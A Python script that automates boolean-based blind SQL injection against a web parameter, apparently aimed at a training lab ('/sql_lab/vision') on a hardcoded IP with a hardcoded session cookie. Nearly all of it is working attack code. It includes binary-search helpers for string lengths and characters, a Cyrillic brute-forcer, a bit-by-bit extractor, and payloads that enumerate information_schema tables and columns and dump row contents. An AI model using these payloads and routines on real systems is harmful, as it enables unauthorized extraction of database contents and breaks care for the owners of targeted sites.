#!/usr/bin/env python3
from connect import my_request as req
import time


def find_key_len(url: str, payload: str,
                 p: str, m_row: str, cook={}) -> int:
    left = -1
    right = 30
    while right > left + 1:
        middle = (left + right) // 2
        param = {p: payload % f'>{middle}'}
        response = req.get_request(url, param, cook)
        time.sleep(3)
        if m_row in response:
            left = middle
        else:
            right = middle
    return right


def find_binary(url: str, payload: str,
                p: str, m_row: str, left: int, right: int, len_of_key: int, cook={}) -> int:
    result = ''
    for i in range(1, len_of_key + 1):
        a = left
        b = right
        while b - a != 0:
            middle = a + (b - a) // 2 + 1

            # проверка кириллицы

            param = {p: payload % (i, f'>127')}
            if m_row in req.get_request(url, param, cook):
                print('Кириллица')
            time.sleep(3)

            param = {p: payload % (i, f'<{middle}')}
            response = req.get_request(url, param, cook)
            time.sleep(3)

            if m_row in response:
                b = middle - 1
            else:
                a = middle
        # end of str
        if a == 32 and b == 32:
            print('end of str')
            break

        print(chr(a), ' kod: ', a)
        result += chr(a)
    return result


def find_binary_cyrr(url: str, payload: str,
                     p: str, m_row: str, left: int, right: int, len_of_key: int, cook={}) -> int:

    cyrrilic = ' _^0123456789абвгдеёжзийклмнопрстуфхчцшщъыьэюяАБВГДЕЁЖЗИЙКЛМНОПРСТУФХЧЦШЩЫЭЮЯЬЪ'
    result = ''

    for i in range(1, len_of_key + 1):
        for letter in cyrrilic:
            param = {p: payload % (i, f"='{letter}'")}
            response = req.get_request(url, param, cook)
            time.sleep(3)

            if m_row in response:
                result += letter
                print(result, ' letter: ', letter)
                break

    return result


def find_pass_over_bits(url: str, payload: dict, len_of_key: int,
                        check_func, cook={}, unicode_len_bit=8) -> str:
    '''
    text: str of success in response
    unicode_len_bit: len of char in bits, 8 for ascii, 32 for utf-32 etc.
    '''
    result = ''
    num_of_requests = 0
    for j in range(1, len_of_key * 8 // unicode_len_bit + 1):

        bit = ''
        for i in range(1, unicode_len_bit + 1):
            for k, v in sorted(payload.items()):
                param = {k: v % (j, unicode_len_bit, i)}
                response = req.get_request(url, param, cook)
                time.sleep(3)
                num_of_requests += 1
            if check_func(response):
                bit += '1'
            else:
                bit += '0'

        print(bit, hex(int(bit, 2))[2:])
        uni_letter = chr(int(bit, 2))
        print(uni_letter)
        result += uni_letter

    print('num_of_requests:', num_of_requests)
    return result


def check_func(*args) -> bool:
    '''
    check string in response of request
    args[0]: response
    '''
    return 'eye' in args[0]


def main():

    url = "http://178.208.95.16/sql_lab/vision"
    # url = 'http://localhost/news11.php'
    test_str = '>eye<'
    main_id = 'table'
    cook = dict(
        session='eyJfcGVybWFuZW50Ijp0cnVlLCJ1c2Vyc0xvZ2dlZCI6InJkem9ncyJ9.YnzZMA.c5mcwY9koq-WJE18kKRTNQGbBwI')

    database = 'sql_test'
    '''
    param = dict(table=f"5') and database()='sql_test' -- -")
    response = req.get_request(url, param, cook)
    print(response)

    time.sleep(3)

    if test_str not in response:

        print('base is not sql_test')

        len_of_key = find_key_len(
            url, f"1' and length(database())%s -- -", main_id, test_str, cook)
        print(len_of_key)

        database = find_binary(url, f"1' and ascii(mid((select database()),%s,1))%s -- -",
                               main_id, test_str, 32, 126, len_of_key, cook)
    '''
    print('database: ', database)

    # How many tables we have
    '''
    for num_table in range(49, 55):
        payload = f"5') and ascii(mid((SELECT count(*) table_name from information_schema.tables WHERE table_schema=database() limit 0,1),1,1))= {num_table}-- -"
        param = dict(table=payload)
        time.sleep(3)
        if test_str in req.get_request(url, param, cook):
            break

    num_table = int(chr(num_table))
    print('num of tables: ', num_table)
    '''

    num_table = 1

    len_of_table = 20

    # Name of table
    '''
    for j in range(num_table):
        payload = f"5') and ascii(substring((SELECT concat(table_name) from information_schema.tables WHERE table_schema=database() limit {j},1),%s,1))%s-- -"

        table_name = find_binary(
            url, payload, main_id, test_str, 32, 126, len_of_table, cook).strip()

        print('table_name: ', table_name)

    '''
    table_name = 'vision'
    print(table_name)

    # Number columns in table
    '''
    for num_columns in range(49, 58):
        payload = f"5') and ascii(substring((SELECT count(*) column_name from information_schema.columns WHERE table_name='{table_name}' limit 0,1),1,1))={num_columns}-- -"
        param = dict(table=payload)
        time.sleep(3)
        if test_str in req.get_request(url, param, cook):
            break

    num_columns = int(chr(num_columns))
    print(num_columns)
    '''

    num_columns = 2
    print('num of columns: ', num_columns)

    # Name of colums
    '''
    column_name = []
    len_of_column = 20
    for num_col in range(num_columns):
        payload = f"5') and ascii(substring((SELECT concat(column_name) from information_schema.columns WHERE table_name='{table_name}' limit {num_col},1),%s,1))%s-- -"

        column_name.append(find_binary(
            url, payload, main_id, test_str, 32, 126, len_of_column, cook).strip())
    '''
    column_name = ['id', 'glance']
    print(column_name)

    # Unicode len 32 bit
    '''
    unicode_len_bit = 16
    len_of_string = 20
    for name in column_name:
        payload = f"1' and mid(lpad(bin(ord(mid((select reply from blind limit 3,1),%s,1))),%s,0),%s,1)=1 -- -"
        param = dict(blind=payload)
        result = find_pass_over_bits(url, param, len_of_string, check_func,
                                     cook, unicode_len_bit)
        print(result)
    '''

    # What is in column

    len_of_string = 30

    column_content = []
    for num_row in range(6):
        for name in column_name:
            payload = f"5') and ascii(substring((select {name} from {table_name} limit {num_row},1),%s,1))%s-- -"
            column_content.append(find_binary(
                url, payload, main_id, test_str, 32, 126, len_of_string, cook).strip())
            print(name)
            print(column_content)

    '''
    payload = f"1' and substring((select id from blind limit 4,1),%s,1)%s-- -"
    column_cyrr = find_binary_cyrr(
        url, payload, main_id, test_str, 32, 126, len_of_string, cook).strip()
    print(column_cyrr)
    '''


if __name__ == '__main__':
    main()
